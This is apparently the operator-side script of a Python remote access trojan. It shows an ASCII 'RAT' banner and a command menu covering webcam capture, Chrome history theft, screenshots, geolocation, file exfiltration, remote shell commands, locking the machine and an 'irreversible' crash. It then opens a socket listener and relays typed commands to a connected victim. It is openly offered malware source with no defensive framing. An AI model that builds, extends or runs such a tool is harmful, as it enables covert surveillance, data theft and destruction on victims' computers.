import os
import click
import socket



help_menu = """
	
 
                                         ----------------------------------------------------------------------------
                                        |                                                                            |
					|            		██████╗░░█████╗░████████╗                            |
					|            		██╔══██╗██╔══██╗╚══██╔══╝                            |
					|            		██████╔╝███████║░░░██║░░░                            |
					|            		██╔══██╗██╔══██║░░░██║░░░                            |
					|            		██║░░██║██║░░██║░░░██║░░░                            |
					|            		╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░                            |
                                        |                                                                            |
                                        |    0 -> Message # message <message> <count of boxes>                       | 
                                        |    1 -> CMD # CMD # <command>                                              |
                                        |    2 -> campic # campic                                                    |
                                        |    3 -> systeminfo # systeminfo                                            |
                                        |    4 -> web history (support only chrome) # web_history                    |
                                        |    5 -> dir # dir <path>                                                   |
                                        |    6 -> ls # ls                                                            |
                                        |    7 -> current dir # cdr                                                  |
                                        |    8 -> cd # cd <path>                                                     |
                                        |    9 -> move # move <old path> <new path>                                  |
                                        |    10 -> copy # copy <path_from> <path_to>                                 |
                                        |    11 -> del # del <path>                                                  |
                                        |    12 -> file # file <file name> <file extension>                          |
                                        |    13 -> echo (support only .txt files) # echo <text> <file path>          |
                                        |    14 -> download # download <file path>                                   |
                                        |    15 -> upload # <server computer path> <client computer path>            |
                                        |    16 -> geolocate # geolocate                                             |
                                        |    17 -> wallpaper # wallpaper <server computer photo path>                |
                                        |    18 -> screnshot # screnshot                                             |
                                        |    19 -> website # website <link>                                          |
                                        |    20 -> block computer # block <time (optional)> <message (optional)>     |
                                        |    21 -> unblock computer # !unblock                                       |
                                        |    22 -> crash computer (irreversible) # crash <goodbey message>           |
                                        |                                                                            |
                                         ----------------------------------------------------------------------------

"""
click.clear()
print(help_menu)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 5050
host_ip = socket.gethostbyname(socket.gethostname())
bufsize = 1024
print(host_ip)
server_socket.bind((host_ip, port))   
server_socket.listen(1)
client_socket, address = server_socket.accept()
print(f"[CONNECTED] New connection IP: {address[0]} PORT: {address[1]}")
while True:
        command = input("$ ").encode("utf-8")
        client_socket.send(command)
        print(client_socket.recv(bufsize).decode("utf-8"))
        print("#")